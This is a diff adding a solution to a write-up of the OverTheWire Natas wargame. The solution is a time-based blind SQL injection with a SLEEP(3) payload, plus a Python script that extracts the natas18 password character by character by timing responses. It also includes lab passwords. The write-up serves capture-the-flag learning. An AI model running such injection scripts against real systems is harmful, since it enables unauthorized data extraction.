@@ -348,7 +348,48 @@ The result:
 passwd: xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP
 
 ### solution
-time-based SQL injection.
+Check the source code. The only thing we can exploit is the sql query. \
+![Level 18 - 1](images/level_18-1.png)
+
+The response time for an HTTP request is about 150 ms. \
+![Level 18 - 2](images/level_18-2.png)
+
+We can use a time-based SQL injection attack with a delay (3 s) way larger than 150 ms:
+```
+SELECT * from users where username="natas18" and password LIKE BINARY "W%" and SLEEP(3) -- ;"
+```
+If the password guess is correct, then `SLEEP(3)` will be executed. We can detect that by checking the response time of the HTTP request.
+
+A python implementation:
+```python
+# scripts/level_18.py
+import string
+import requests
+
+passwd_dict = string.digits + string.ascii_letters
+auth_username = 'natas17'
+auth_password = '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw'
+passwd = ''
+
+url = 'http://natas17.natas.labs.overthewire.org/index.php'
+for i in range(0, 32):
+    for char in passwd_dict:
+        params = {
+            'username': 'natas18" and password LIKE BINARY "{}{}%" and SLEEP(3) -- ;'.format(passwd, char),
+            'debug'   : True
+        }
+        r = requests.get(url, params=params, auth=(auth_username,auth_password))
+        elps = r.elapsed.total_seconds()
+
+        if elps > 3:
+            passwd += char
+            print(passwd)
+            break
+```
+Note: the expression `r.elapsed.total_seconds()` evaluates to the time interval between the issuing of the HTTP request and the end of the parsing of response headers. The downloading time of the response body is not included. That is exactly what we need, for that we only want to measure the execution time of the sql query.
+
+The result: \
+![Level 18 - 3](images/level_18-3.png)
 
 ## level 19
 passwd: 4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs
